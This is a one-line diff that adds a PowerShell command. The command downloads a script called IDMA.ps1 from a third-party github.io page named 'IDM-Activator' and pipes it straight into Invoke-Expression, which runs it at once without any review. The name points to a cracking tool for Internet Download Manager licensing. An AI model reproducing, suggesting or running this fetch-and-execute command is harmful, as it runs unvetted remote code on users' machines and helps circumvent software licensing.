@@ -1,0 +1,1 @@
+ iwr https://naeembolchhi.github.io/IDM-Activator/IDMA.ps1 | iex
